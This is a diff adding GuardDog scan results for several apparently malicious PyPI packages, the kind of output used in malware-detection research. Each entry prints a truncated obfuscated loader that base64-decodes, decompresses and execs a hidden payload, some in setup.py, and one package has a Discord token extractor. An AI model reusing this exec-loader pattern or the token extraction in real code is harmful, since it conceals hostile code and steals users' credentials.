@@ -1,0 +1,97 @@
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-03/test128123612-0.1
+Found 1 potentially malicious indicators in ./dataset_pypi_live/2024-10-03/test128123612-0.1
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at testlibrary128982/your_code.py:3
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wZSKq//c/+9//lhGcjhtlvTto32gM9PxFg/6ovHVD+rZHiFw9xeMIkrFyAVB5qugqH62YtfzXaGjRYKhae6wpircMJz0dZSehJ2nGpMhpi6YljoDIMGpk552bbVcCly7vPU40OadG7m...rmUwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-03/Alfooou-1.0.0
+Found 1 potentially malicious indicators in ./dataset_pypi_live/2024-10-03/Alfooou-1.0.0
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at Alfooou/Alfooou.py:1
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==ACsf1W/ff/+/3iS+/e4Ni7yfq9FvJ6HWyctb8rzjIt1uK0Cgr7AzpvmK61u+jXCCEAUgFIAuEogt1WO4PFqfmhYsFNn0KZSdcmo5W+Gn0s7fUkI+KiY4m7L45M35y2DS828LtcaHdPP...0lVwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-03/package-lib8127-0.1
+Found 1 potentially malicious indicators in ./dataset_pypi_live/2024-10-03/package-lib8127-0.1
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at package_lib8127/my_module.py:6
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wZSKq//c/+9//lhGcjhtlvTto32gM9PxFg/6ovHVD+rZHiFw9xeMIkrFyAVB5qugqH62YtfzXaGjRYKhae6wpircMJz0dZSehJ2nGpMhpi6YljoDIMGpk552bbVcCly7vPU40Oa...rmUwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-03/testlibrary128982-0.1
+Found 1 potentially malicious indicators in ./dataset_pypi_live/2024-10-03/testlibrary128982-0.1
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at testlibrary128982/your_code.py:3
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wZSKq//c/+9//lhGcjhtlvTto32gM9PxFg/6ovHVD+rZHiFw9xeMIkrFyAVB5qugqH62YtfzXaGjRYKhae6wpircMJz0dZSehJ2nGpMhpi6YljoDIMGpk552bbVcCly7vPU40OadG7m...rmUwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live_scan/2024-12-03/graphicsx-0.1
+Found 1 potentially malicious indicators in ./dataset_pypi_live_scan/2024-12-03/graphicsx-0.1
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at setup.py:9
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'oimI4Hw//+9z5rGXgROhD23vJYLacGIoQYOfzPRcx0/ZjTZRgdQfmEdDgCFCuoLJahbHPtX/AIEATIYCvFNqe8yMDSxRACdaLFHwbP7fMugMRkeI5YqHPCfk4j+Ax7jmlMPaVvZW3oaEz...c7lVwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-06/cutepy32-0.0.1
+Found 1 potentially malicious indicators in ./dataset_pypi_live/2024-10-06/cutepy32-0.0.1
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at cutepy32/colorizing.py:1
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==Adt6cy//973zvUnSmNZj5spL8cQaURMT8wPeSoOTvv32MC3LzA3ocQM9l6WPKEr8Q3ZAEMoIXrEoAKEuhnE9Jbl+vvwXJtvsUhpsD2R164K2N9/2Ip3SJBfkQHOIX30k3Of/uBjSiCT...dsmUwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-03/pyutiltool-3.5
+Found 2 potentially malicious indicators in ./dataset_pypi_live/2024-10-03/pyutiltool-3.5
+
+api-obfuscation: found 2 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at pyutiltool/__init__.py:3
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wnOkzYB8/33n//W2q5Ng7Z8wh7708EgGLvb8nnOSay/OJW8tyXf7br4RLu/YAqiYghAu6k7/bynCBK+jANRSfMfsz3IuibLP3ZLdO9Pk7c6IjZmiUEDA+nO4lKg7B6ecFyANCvv7Xdg...jlVwJe'))
+  * This package uses obfuscated API calls that may evade static analysis detection at pyutiltool/my_module.py:4
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'VZAMW/T///3n5rG3Qsthz/9195NacqJoO5C9Q6FL6b3Cr9TZ2LBK9nsrqwgu/nQM32Sba3JEBYimAJK8pQqmNoL1783JcwBKDftKM6/a9q7Psf41kk5vXu7Z2+I27DHjuQ2bttjBxb4SB...zlNwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live_scan/2024-11-26/taoreg-0.1.1
+Found 2 potentially malicious indicators in ./dataset_pypi_live_scan/2024-11-26/taoreg-0.1.1
+
+api-obfuscation: found 2 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at src/taoreg/bootcli.py:4
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=QlvXW+P97v//rsUgbo03oRGkthYRm6aWEllPFzNTQH3p4ABgfsQWeaZ5DnpxlC54+uWOgDo3CvTweZwAccbS5L+DhJhOgnYhRlB9izYGSy78USPRsh2tePrLsYzBNgH26uYRybM5FXgr...8lVwJe'))
+  * This package uses obfuscated API calls that may evade static analysis detection at src/taoreg/pcli.py:4
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'qDR2MCw/vvP//vsVwbIgoathom9S/fZ3Pehs1+XWNxQ7vz30J+BA+Wl3mRqI/ry9lZBKdTwC+27DA7F0BRKJHUVpv1Nl1vOjU92q4IUwKBWrLJMKr9jSA0yLCXJTSrk1oCd/iQBqXrYv4...MmVwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live_scan/2024-12-05/intgraphx-0.1
+Found 1 potentially malicious indicators in ./dataset_pypi_live_scan/2024-12-05/intgraphx-0.1
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at setup.py:10
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gg+t3ZB8/3vfO/l6CDtNXd/XDhnTBTNaniTMEdgtovkcy6crDoqS8HSeIdgaxQ92uyUWJWOhPICEgVRVLIu/TuohhTvSkR/ipsKI8sAZ80soR//4BHO+kCTpBO8FAzvv+qjq2KSYwtI...c0lNwJe'))
+
+=================================================================================================================
+
+$ guarddog pypi scan ./dataset_pypi_live/2024-10-02/Titan-Osint-0.1
+Found 3 potentially malicious indicators in ./dataset_pypi_live/2024-10-02/Titan-Osint-0.1
+
+shady-links: found 2 source code matches
+  * This package contains an URL to a domain with a suspicious extension at osint_lib/osint_tracker.py:42
+        "Discord": "https://discord.com/users/{}",
+  * This package contains an URL to a domain with a suspicious extension at osint_lib/token_extractor.py:22
+        url = "https://discord.com/api/v9/users/@me"
+
+api-obfuscation: found 1 source code matches
+  * This package uses obfuscated API calls that may evade static analysis detection at osint_lib/cli.py:4
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QIHztP/vv///n6U7PGkb08+3yG8OtOd8hKN5+ZWzzOH3z+7P3i8DGMgdNyRO7v1hI2LsCrQk0JQnwqxIcN+nELSoErS5G/o2XWbxg4QgPfGNfV5OulRHzGhaYSvnEnicN/8orownIZL...8lVwJe'))
